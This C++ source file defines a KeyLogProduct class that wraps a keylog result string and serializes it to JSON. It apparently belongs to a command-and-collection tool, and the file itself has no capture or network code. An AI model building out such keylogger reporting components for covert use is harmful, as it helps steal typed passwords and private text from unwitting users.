#include "KeyLogProduct.h"
using namespace xp_collector;

KeyLogProduct::KeyLogProduct(std::string product_id, const CommandType product_type, std::string result)
	: BasicProduct(std::move(product_id), product_type)
	  , m_result(std::move(result))
{
}

json KeyLogProduct::serialize()
{
	json result = BasicProduct::serialize();
	result[CONTENT_FIELD_NAME] = {{"keylog", m_result}};
	return result;
}
